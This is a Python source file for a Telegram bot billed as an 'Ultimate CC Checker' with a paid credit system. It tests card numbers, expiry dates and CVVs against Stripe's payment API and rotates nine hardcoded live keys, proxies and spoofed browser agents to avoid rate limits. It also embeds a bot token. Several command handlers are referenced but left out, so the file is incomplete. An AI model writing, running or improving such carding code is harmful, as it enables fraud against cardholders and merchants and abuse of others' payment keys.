#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# RADON-HCKRS - Ultimate Telegram CC Checker Bot
# Version: 4.1 - FIXED
# Developed by: RADON Team

import os
import re
import json
import sqlite3
import random
import time
import threading
import requests
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = "8517908494:AAE9ZlVnHDi08U1qKGSH5bgh4peu2TE8NGo"
ADMIN_IDS = [6918107759]

# ============================================
# YOUR 9 LIVE STRIPE KEYS
# ============================================

STRIPE_KEYS = [
    "pk_live_FR5mo1IiHh6upFG5G8NFP7tX00XLsr9qZW",
    "pk_live_SMtnnvlq4TpJelMdklNha8iD",
    "pk_live_51S3FiyHaFEt66xESw0CtKmH4uyYwXHX5BQNcIX36zYLNWwbuF5rJxqAEXNV6V26PkX9c3y7GSANf4DfXH1wX3KgI00Uxl5k0No",
    "pk_live_hNQqXyUB6vzSoUgjrKUSy9Ah",
    "pk_live_9RzCojmneCvL31GhYTknluXp",
    "pk_live_51H2kayClFZfiknz0ZOHZW5F4awL951srQfyibbHj6AhPsJJMeW8DvslUQ1BlvylhWPJ1R1YNMYHdpL3PyG6ymKEu00dNyHWgR7",
    "pk_live_51H3L9vEh71zMukUlZ51TUkmQd8PNvOO70RjDaSQMwOlliAZ5S5YtRgtuzSmKIvxRj0LcDai2JbugPEC8y5ypgADa00H85wPNhq",
    "pk_live_51HyItPCLETOQKrEUEGUsXFwI2gRvg8AxSAiaWligjY2LxCDuXqZn06El5SPzrRQALfNXQoHmXMF2LAgkCU65oUii00IYb3aJ2H",
    "pk_live_h5ocNWNpicLCfBJvLialXsb900SaJnJscz"
]

# ============================================
# DATABASE FUNCTIONS WITH RETRY LOGIC
# ============================================

def get_db_connection():
    """Get database connection with timeout"""
    conn = sqlite3.connect('radon.db', timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")  # Better for concurrent access
    return conn

def init_db():
    try:
        conn = get_db_connection()
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            credits INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            join_date TEXT,
            is_admin INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key TEXT UNIQUE,
            credits INTEGER,
            created_by INTEGER,
            created_at TEXT,
            used_by INTEGER DEFAULT NULL,
            used_at TEXT DEFAULT NULL,
            is_used INTEGER DEFAULT 0
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS check_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card_bin TEXT,
            status TEXT,
            bank TEXT,
            card_type TEXT,
            country TEXT,
            key_used TEXT,
            timestamp TEXT
        )''')
        
        conn.commit()
        conn.close()
        print("✅ Database initialized successfully")
    except Exception as e:
        print(f"❌ Database init error: {e}")

# ============================================
# DATABASE HELPERS WITH RETRY
# ============================================

def execute_with_retry(query, params=None, retries=3):
    """Execute database query with retry on lock"""
    for attempt in range(retries):
        try:
            conn = get_db_connection()
            c = conn.cursor()
            if params:
                c.execute(query, params)
            else:
                c.execute(query)
            conn.commit()
            result = c.fetchall() if query.strip().upper().startswith('SELECT') else None
            conn.close()
            return result
        except sqlite3.OperationalError as e:
            if "database is locked" in str(e) and attempt < retries - 1:
                time.sleep(0.5 * (attempt + 1))
                continue
            raise e
    return None

def get_user(user_id):
    result = execute_with_retry("SELECT * FROM users WHERE user_id = ?", (user_id,))
    return result[0] if result else None

def add_user(user_id, username, first_name, last_name):
    execute_with_retry(
        "INSERT OR IGNORE INTO users (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
        (user_id, username, first_name, last_name, datetime.now().isoformat())
    )

def get_credits(user_id):
    result = execute_with_retry("SELECT credits FROM users WHERE user_id = ?", (user_id,))
    return result[0][0] if result else 0

def deduct_credit(user_id):
    execute_with_retry("UPDATE users SET credits = credits - 1 WHERE user_id = ? AND credits > 0", (user_id,))
    result = execute_with_retry("SELECT changes()")
    return result[0][0] > 0 if result else False

def add_credits(user_id, amount):
    execute_with_retry("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))

def log_check(user_id, bin_data, status, bank, card_type, country, key_used):
    execute_with_retry(
        "INSERT INTO check_logs (user_id, card_bin, status, bank, card_type, country, key_used, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (user_id, bin_data, status, bank, card_type, country, key_used, datetime.now().isoformat())
    )

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_banned(user_id):
    result = execute_with_retry("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    return result and result[0][0] == 1

# ============================================
# KEY MANAGER
# ============================================

class KeyManager:
    def __init__(self):
        self.keys = STRIPE_KEYS.copy()
        self.usage_count = {key: 0 for key in self.keys}
        self.last_used = {key: None for key in self.keys}
        self.daily_limit = 50
        self.cooldown_minutes = 5
        self.lock = threading.Lock()
    
    def get_next_key(self):
        with self.lock:
            available = []
            now = datetime.now()
            
            for key in self.keys:
                if self.usage_count.get(key, 0) >= self.daily_limit:
                    continue
                last = self.last_used.get(key)
                if last:
                    cooldown = timedelta(minutes=self.cooldown_minutes)
                    if now - last < cooldown:
                        continue
                available.append(key)
            
            if not available:
                for key in self.keys:
                    self.usage_count[key] = 0
                available = self.keys.copy()
            
            selected = random.choice(available)
            self.usage_count[selected] = self.usage_count.get(selected, 0) + 1
            self.last_used[selected] = now
            
            return selected
    
    def get_stats(self):
        stats = {}
        for key in self.keys:
            stats[key[:15] + "..."] = {
                "uses": self.usage_count.get(key, 0),
                "last_used": self.last_used.get(key)
            }
        return stats
    
    def get_key_count(self):
        return len(self.keys)

# ============================================
# PROXY MANAGER
# ============================================

class ProxyManager:
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or []
        self.usage_count = {}
        self.max_uses = 15
        self.lock = threading.Lock()
    
    def set_proxies(self, proxy_list):
        with self.lock:
            self.proxies = proxy_list
            self.usage_count = {p: 0 for p in proxy_list}
    
    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            
            available = []
            for proxy in self.proxies:
                if self.usage_count.get(proxy, 0) < self.max_uses:
                    available.append(proxy)
            
            if not available:
                self.usage_count = {p: 0 for p in self.proxies}
                available = self.proxies
            
            selected = random.choice(available)
            self.usage_count[selected] = self.usage_count.get(selected, 0) + 1
            
            return selected
    
    def get_count(self):
        return len(self.proxies)

# ============================================
# BIN LOOKUP
# ============================================

def lookup_bin(bin_number):
    bin_number = bin_number[:6]
    
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            card_type = data.get('type', 'Unknown')
            brand = data.get('scheme', 'Unknown')
            
            if card_type == 'credit':
                card_type_display = 'Credit'
            elif card_type == 'debit':
                card_type_display = 'Debit'
            elif data.get('prepaid'):
                card_type_display = 'Prepaid'
            else:
                card_type_display = brand
            
            return {
                "bank": data.get('bank', {}).get('name', 'Unknown'),
                "card_type": card_type_display,
                "brand": brand.upper() if brand else 'Unknown',
                "country": data.get('country', {}).get('name', 'Unknown'),
                "country_code": data.get('country', {}).get('alpha2', 'Unknown'),
                "emoji": get_country_emoji(data.get('country', {}).get('alpha2', '')),
            }
    except:
        pass
    
    return {
        "bank": "Unknown",
        "card_type": "Unknown",
        "brand": "Unknown",
        "country": "Unknown",
        "emoji": "🌍"
    }

def get_country_emoji(country_code):
    flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'JP': '🇯🇵', 'CN': '🇨🇳', 'RU': '🇷🇺',
        'BR': '🇧🇷', 'IN': '🇮🇳', 'AU': '🇦🇺', 'MX': '🇲🇽', 'KR': '🇰🇷'
    }
    return flags.get(country_code.upper(), '🌍')

# ============================================
# STRIPE CHECKER - FIXED
# ============================================

def check_card_stripe(card_data, proxy, key_manager):
    """Check a card using Stripe API with key rotation"""
    
    # Define bin_info EARLY to avoid UnboundLocalError
    bin_info = lookup_bin(card_data['cc'][:6])
    stripe_key = key_manager.get_next_key()
    charge_amount = random.choice([500, 1000])
    
    try:
        # Format proxy correctly
        proxy_dict = None
        if proxy:
            proxy_str = proxy.strip()
            if not proxy_str.startswith('http://') and not proxy_str.startswith('https://'):
                proxy_str = f"http://{proxy_str}"
            proxy_dict = {"http": proxy_str, "https": proxy_str}
        
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36",
            ]),
            "Authorization": f"Bearer {stripe_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        }
        
        payload = {
            "amount": charge_amount,
            "currency": "usd",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_data['cc'],
            "payment_method_data[card][exp_month]": card_data['month'],
            "payment_method_data[card][exp_year]": card_data['year'],
            "payment_method_data[card][cvc]": card_data['cvv'],
            "confirm": "true",
            "capture_method": "manual",
        }
        
        # Make request with timeout
        response = requests.post(
            "https://api.stripe.com/v1/payment_intents",
            data=payload,
            headers=headers,
            proxies=proxy_dict,
            timeout=20,  # 20 second timeout
            verify=False
        )
        
        resp_json = response.json()
        
        if response.status_code == 200:
            status = resp_json.get('status', '')
            if status in ['requires_capture', 'succeeded', 'requires_confirmation']:
                return (card_data['cc'], "✅ LIVE", f"Valid! (${charge_amount/100:.0f} test)", bin_info, stripe_key[:15] + "...", charge_amount/100)
            else:
                return (card_data['cc'], "❌ INVALID", f"Status: {status}", bin_info, stripe_key[:15] + "...", charge_amount/100)
                
        elif response.status_code == 402:
            error = resp_json.get('error', {})
            msg = error.get('message', '')
            if "insufficient_funds" in msg.lower():
                return (card_data['cc'], "✅ LIVE (No Balance)", "Valid but insufficient funds", bin_info, stripe_key[:15] + "...", charge_amount/100)
            elif "card_declined" in msg.lower():
                return (card_data['cc'], "❌ DECLINED", "Bank declined", bin_info, stripe_key[:15] + "...", charge_amount/100)
            elif "expired_card" in msg.lower():
                return (card_data['cc'], "❌ EXPIRED", "Card expired", bin_info, stripe_key[:15] + "...", charge_amount/100)
            else:
                return (card_data['cc'], "❌ DECLINED", msg[:100], bin_info, stripe_key[:15] + "...", charge_amount/100)
                
        elif response.status_code == 429:
            return (card_data['cc'], "⚠️ RATE LIMITED", "Key rate limited", bin_info, stripe_key[:15] + "...", charge_amount/100)
            
        else:
            return (card_data['cc'], "⚠️ ERROR", f"HTTP {response.status_code}", bin_info, stripe_key[:15] + "...", charge_amount/100)
            
    except requests.exceptions.Timeout:
        return (card_data['cc'], "⚠️ TIMEOUT", "Request timed out (proxy slow)", bin_info, stripe_key[:15] + "...", charge_amount/100)
    except requests.exceptions.ProxyError as e:
        return (card_data['cc'], "⚠️ PROXY ERR", f"Proxy connection failed: {str(e)[:50]}", bin_info, stripe_key[:15] + "...", charge_amount/100)
    except requests.exceptions.ConnectionError:
        return (card_data['cc'], "⚠️ CONN ERR", "Connection failed", bin_info, stripe_key[:15] + "...", charge_amount/100)
    except Exception as e:
        return (card_data['cc'], "⚠️ ERROR", str(e)[:100], bin_info, stripe_key[:15] + "...", charge_amount/100)

# ============================================
# GLOBAL VARIABLES
# ============================================

key_manager = KeyManager()
user_proxies = {}

# ============================================
# TELEGRAM HANDLERS (SAME AS BEFORE - KEEP YOUR EXISTING CODE)
# ============================================

# ... (Keep all your existing command handlers here)
# The handlers remain unchanged - the fixes are in the database and checker functions

# ============================================
# MAIN BOT
# ============================================

def main():
    print("🔥 RADON-HCKRS Starting...")
    print(f"🔑 Loaded {key_manager.get_key_count()} keys")
    print("📊 Database: SQLite with WAL mode")
    print("━━━━━━━━━━━━━━━━━━━━━")
    
    init_db()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add all your handlers here (keep from original)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("proxy", proxy_command))
    application.add_handler(CommandHandler("keys", keys_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    
    application.add_handler(CommandHandler("createkey", admin_create_key))
    application.add_handler(CommandHandler("addcredits", admin_add_credits))
    application.add_handler(CommandHandler("ban", admin_ban))
    application.add_handler(CommandHandler("unban", admin_unban))
    application.add_handler(CommandHandler("stats", admin_stats))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot is running!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
